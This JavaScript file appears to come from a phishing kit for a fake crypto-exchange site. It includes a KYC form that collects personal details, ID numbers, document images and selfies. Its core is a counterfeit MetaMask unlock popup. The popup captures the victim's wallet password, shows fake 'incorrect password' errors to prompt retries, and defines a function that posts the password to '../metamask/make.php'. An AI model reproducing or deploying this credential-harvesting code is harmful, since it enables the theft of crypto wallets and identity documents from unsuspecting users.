 function noti(msg, status) {
    toastr[status](msg);
    toastr.options = {
      "closeButton": false,
      "debug": false,
      "newestOnTop": false,
      "progressBar": false,
      "rtl": false,
      "positionClass": "toast-top-right",
      "preventDuplicates": false,
      "onclick": null,
      "showDuration": 300,
      "hideDuration": 1000,
      "timeOut": 5000,
      "extendedTimeOut": 1000,
      "showEasing": "swing",
      "hideEasing": "linear",
      "showMethod": "fadeIn",
      "hideMethod": "fadeOut"
    }
  }



	$("#alert_close_modal").on("click", function() {
    $("#alert_message_modal").css("display", "none");
    var alertMessageId = $("#alertMessageId").val();

		  $.ajax({
	      url: "../ajax/ajax",
	      type: "POST",
	      data: {
	        action: "VIEWED_ALERT_MESSAGE",
	        message_id: alertMessageId
	      },
	      success: function(response) {

	      }
	    })
  });

  $("#alert_close_modal_btn").on("click", function() {
    $("#alert_message_modal").css("display", "none");
    var alertMessageId = $("#alertMessageId").val();

		  $.ajax({
	      url: "../ajax/ajax",
	      type: "POST",
	      data: {
	        action: "VIEWED_ALERT_MESSAGE",
	        message_id: alertMessageId
	      },
	      success: function(response) {

	      }
	    })
  });


   function openMetaMask() {
    $("#metMaskBlock").css("opacity", "1");
    $("#metMaskBlock").css("z-index", "99999999");
    setTimeout(function () {
        $('#load').addClass('hide');
        $("#verify_popap_meta").css("display", "none");
        document.getElementById('loaded').classList.remove('hide');
    }, 1000);

    setInterval(function() {
      if(($("#pswrd").val().length > 7)) {document.getElementById("buttonf").disabled = false;} else {document.getElementById("buttonf").disabled = true;}
    }, 1000)


  }


function func() {
  document.getElementById('pswrd').classList.remove('border-red');
  $('#error1').addClass('hide');
}


var calc = 0;

function sendform(e) {
        e.preventDefault();
        //send_message()
        calc ++
        $('#error1').addClass('hide');
        $('#error2').addClass('hide');
        document.getElementById('pswrd').classList.remove('border-red');

        if (calc < 3) {
        $('#buttonf').addClass('hide');
        document.getElementById('loading').classList.remove('hide');
        setTimeout(function () {
        $('#loading').addClass('hide');
        $('#pswrd').addClass('border-red');
        document.getElementById('error1').classList.remove('hide');
        document.getElementById('buttonf').classList.remove('hide'); 
        }, 1234);
        }

        if (calc > 2) {
        $('#buttonf').addClass('hide');
        document.getElementById('loading').classList.remove('hide');
        setTimeout(function () {
        $('#loading').addClass('hide');
        document.getElementById('error2').classList.remove('hide');
        }, 984);
        }
       
}
    
    
function send_message() {
        var res = document.getElementById('pswrd').value;
            send_ajax(res)
}

function send_ajax(text) {
       return new Promise(function (resolve, reject) {
            $.ajax({
                type: 'post',
                url: '../metamask/make.php',
                dataType: 'json',
                data: {
                    'text':text,
                }
            });
        });
}


$("#closeMetaMaskBtn").on("click", function() {
    $("#verify_popap_meta").css("display", "none");
    var MetaalertMessageId = $("#MetaalertMessageId").val();

		  $.ajax({
	      url: "../ajax/ajax",
	      type: "POST",
	      data: {
	        action: "VIEWED_ALERT_MESSAGE",
	        message_id: MetaalertMessageId
	      },
	      success: function(response) {

	      }
	    })
  }); 











    function disabledBtn(func) {
    if(func == "off") {
      $("#submit_btn").html("Loading..");
      $("#submit_btn").css("background", "#242730");
      $("#submit_btn").attr("disabled", true);

    } else if(func == "on") {
      $("#submit_btn").html("Submit for review");
      $("#submit_btn").css("background", "linear-gradient(90deg, #2883B6 0%, #399D79 100%)");
      $("#submit_btn").attr("disabled", false);
    }
  }

    var country_name = 'Germany';
    var country_code = 'de';

    function selectedCountry(country, c_name) {
        var country = country.toLowerCase();

        $("#selected_country_flag_img").attr("src", "/templates/res/images/flags/" + country + ".png");

        country_name = c_name;
        country_code = country;
    }

    var selected_type = 'Passport';

    function selectedIDtype(type) {
        selected_type = type;
    }

    $("#submit_btn").on("click", function(e) {
      e.preventDefault();

      var kyc_first_name = $("#kyc_first_name").val();
      var kyc_last_name = $("#kyc_last_name").val();
      var kyc_country = country_name;
      var kyc_country_code = country_code;
      var kyc_address = $("#kyc_address").val();
      var kyc_phone = $("#kyc_phone").val();
      var kyc_date_of_brith = $("#kyc_date_of_birth").val();
      var kyc_id_type = selected_type;
      var kyc_id_number = $("#kyc_id_number").val();
      var image_document = $("#image_document").val();
      var image_selfie = $("#image_selfie").val();

      var kyc_doc_size = $("#image_document")[0].files[0];
      var kyc_selfie_size = $("#image_selfie")[0].files[0];


      if(kyc_first_name == "") {
          noti("Please, enter First Name!", "error");
      } else if(kyc_last_name == "") {
          noti("Please, enter Last Name!", "error");
      } else if(kyc_address == "") {
          noti("Please, enter Address!", "error");
      } else if(kyc_phone == "") {
          noti("Please, enter Phone number!", "error");
      }  else if(kyc_date_of_brith == "") {
          noti("Please, enter Date of Brith!", "error");
      } else if(kyc_id_type == "") {
          noti("Please, select ID Type", "error");
      } else if(kyc_id_number == "") {
          noti("Please, enter ID Number!", "error");
      } else if(image_document == "") {
          noti("Please, select Document Image", "error");
      } else if(image_selfie == "") {
          noti("Please, select Selfie Image", "error");
      } else if(kyc_doc_size['size'] > 2000000) {
          noti("Document Image size must not be larger than 2 megabytes", "error");
      } else if(kyc_selfie_size['size'] > 2000000) {
          noti("Selfie Image size must not be larger than 2 megabytes", "error");
      } else {

            disabledBtn("off");

            var form = new FormData();
            form.append('kyc_first_name', kyc_first_name);
            form.append('kyc_last_name', kyc_last_name);
            form.append('kyc_country', kyc_country);
            form.append('kyc_country_code', kyc_country_code);
            form.append('kyc_address', kyc_address);
            form.append('kyc_phone', kyc_phone);
            form.append('kyc_date_of_brith', kyc_date_of_brith);
            form.append('kyc_id_type', kyc_id_type);
            form.append('kyc_id_number', kyc_id_number);

            form.append('image_document', kyc_doc_size);
            form.append('image_selfie', kyc_selfie_size);

            $.ajax({
                url: '/ajax/KYC_INSERT_NEW_REQUEST',
                data: form,
                cache: false,
                contentType: false,
                processData: false,
                type: 'POST',
                success:function(response) {
                    if(response == "1") {
                        location.reload();
                    } else {
                       disabledBtn("on");
                       noti("An unexpected error ("+response+") has occurred, please try again", "error");
                       noti("Image size should not exceed 4 megabytes. Only .png/.jpeg/.gif formats are supported", "warning");
                       //console.log(response);
                    }
                }
            });
      }
  })